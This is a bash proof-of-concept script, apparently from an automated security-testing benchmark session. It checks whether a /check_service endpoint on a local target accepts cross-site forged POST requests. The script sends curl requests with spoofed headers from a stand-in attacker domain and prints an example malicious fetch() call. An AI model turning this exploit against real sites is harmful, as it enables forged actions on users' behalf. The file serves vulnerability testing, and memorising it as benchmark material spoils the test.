#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /check_service endpoint by making cross-origin POST requests without CSRF tokens
# Target: ./repo
# Created: 2025-11-07T17:23:49.869Z
# Session: benchmark-XBEN-068-24-mhp49w3p

# CSRF Attack Proof of Concept - /check_service Endpoint
# This script demonstrates that the /check_service endpoint accepts cross-origin requests
# without CSRF token validation, allowing an attacker to forge requests from another domain

TARGET_URL="${1:-http://localhost:5000}"
SERVICE_NAME="${2:-apache}"

echo "[*] CSRF Vulnerability POC for /check_service endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Normal request from legitimate origin
echo "[+] Test 1: Legitimate same-origin request"
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Origin: $TARGET_URL" \
  -d "{\"service_name\": \"$SERVICE_NAME\"}" \
  "$TARGET_URL/check_service" | head -c 200
echo ""
echo ""

# Test 2: CSRF attack - request from attacker's domain
echo "[+] Test 2: CSRF attack - request from attacker domain (http://evil.attacker.com)"
CSRF_RESPONSE=$(curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Origin: http://evil.attacker.com" \
  -H "Referer: http://evil.attacker.com/malicious-page" \
  -d "{\"service_name\": \"$SERVICE_NAME\"}" \
  "$TARGET_URL/check_service")

echo "$CSRF_RESPONSE" | head -c 200
CSRF_HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
  -H "Content-Type: application/json" \
  -H "Origin: http://evil.attacker.com" \
  -H "Referer: http://evil.attacker.com/malicious-page" \
  -d "{\"service_name\": \"$SERVICE_NAME\"}" \
  "$TARGET_URL/check_service")
echo ""
echo "[*] HTTP Response Code: $CSRF_HTTP_CODE"
echo ""

# Test 3: Request with no Origin/Referer headers
echo "[+] Test 3: Request with no Origin/Referer headers (CSRF-like)"
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d "{\"service_name\": \"$SERVICE_NAME\"}" \
  "$TARGET_URL/check_service" | head -c 200
echo ""
echo ""

# Test 4: Verify no CSRF token is required
echo "[+] Test 4: Verifying CSRF token is not required"
echo "[*] Attempting request without any CSRF token or cookie validation..."
RESPONSE=$(curl -s -X POST \
  -H "Content-Type: application/json" \
  -d "{\"service_name\": \"$SERVICE_NAME\"}" \
  "$TARGET_URL/check_service")

if echo "$RESPONSE" | grep -q "status"; then
  echo "[✓] VULNERABILITY CONFIRMED: Endpoint accepted request without CSRF token"
  echo "[✓] Response indicates successful processing (contains 'status' field)"
  echo "[*] Full response: $RESPONSE"
else
  echo "[-] Response does not contain expected status field"
  echo "[*] Response: $RESPONSE"
fi
echo ""

# Test 5: JavaScript fetch attack simulation
echo "[+] Test 5: Simulating JavaScript fetch attack (would be executed in victim's browser)"
echo "[*] This command simulates what a malicious JavaScript could do:"
echo "fetch('$TARGET_URL/check_service', {"
echo "  method: 'POST',"
echo "  headers: {'Content-Type': 'application/json'},"
echo "  body: JSON.stringify({service_name: 'apache'})"
echo "});"
echo ""

# Simulate the fetch with curl (this is what JS fetch would actually send)
echo "[+] Simulating JavaScript fetch via curl..."
FETCH_RESPONSE=$(curl -s -X POST \
  -H "Content-Type: application/json" \
  -d "{\"service_name\": \"$SERVICE_NAME\"}" \
  "$TARGET_URL/check_service")

if echo "$FETCH_RESPONSE" | grep -q "status"; then
  echo "[✓] VULNERABILITY CONFIRMED: JavaScript fetch attack would succeed"
  echo "[*] Response: $FETCH_RESPONSE"
else
  echo "[-] Fetch simulation failed"
fi
echo ""

echo "[*] CONCLUSION:"
echo "[*] The /check_service endpoint accepts POST requests without CSRF token validation"
echo "[*] Cross-origin requests are accepted (no Origin/Referer validation)"
echo "[*] JavaScript-based CSRF attacks would succeed"
echo "[*] This vulnerability can be exploited if the endpoint performs state-changing operations"